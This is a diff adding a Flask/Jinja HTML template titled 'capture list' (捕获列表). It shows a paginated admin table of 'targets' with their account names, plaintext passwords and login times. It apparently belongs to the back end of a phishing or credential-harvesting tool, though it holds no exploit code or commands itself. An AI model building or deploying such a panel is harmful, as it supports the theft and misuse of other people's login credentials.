@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>捕获列表</title>
+</head>
+<body>
+    <div class="contentWrapper">
+        <table width="100%" class="tab" id="myTab" style="top:10px;border-color: #e3e3e3;" frame=void>
+            <tr style="border-bottom:1px solid #e3e3e3;">
+                <th>id</th>
+                <th>账号</th>
+                <th>密码</th>
+                <th>时间</th>
+            </tr>
+            {% for target in targetlist %}
+            <tr width="100%" style="border-bottom:1px solid #e3e3e3;">
+                <td>{{target.id}}</td>
+                <td>{{target.username}}</td>
+                <td>{{target.password}}</td>
+                <td>{{target.logindate}}</td>
+                <!-- <hr> -->
+            </tr>
+            {% endfor %}
+            <table frame=void class="page-number" style="position: absolute;top:1200px;background-color: #f8f8ff;width:600px;">
+                <tr>
+                    <td class="td" style="white-space: nowrap;">当前页数: {{paginate.page}}</td>
+                    <td class="td">总页数: {{paginate.pages}}</td>
+                    <td class="td">共有 {{paginate.total}} 条数据</td>
+                    <td class="td">
+                        页码：
+                        {% for i in paginate.iter_pages() %}
+                        <a href="{{url_for('adminindex',page=i)}}"
+                            style="border:#d3d3d3 solid 1px;padding:2px 5px;border-radius:2px;">{{ i }}</a>
+                        {% endfor %}</td>
+                    {% if paginate.has_prev %}
+                    <td class="td" style="margin-right:20px;">
+                        <a href="{{url_for('adminindex',page=paginate.prev_num)}}"
+                            style="border:#d3d3d3 solid 1px;padding:5px 7px;border-radius: 4px;">上一页</a>
+                        {% endif %}</td>
+
+                    <td class="td" style="margin-right:20px;">
+                        {% if paginate.has_next %}
+                        <a href="{{url_for('adminindex',page=paginate.next_num)}}"
+                            style="border:#d3d3d3 solid 1px;padding:5px 7px;border-radius: 4px;">下一页</a>
+                        {% endif %}</td>
+                </tr>
+            </table>
+        </table>
+    </div>
+</body>
+</html>
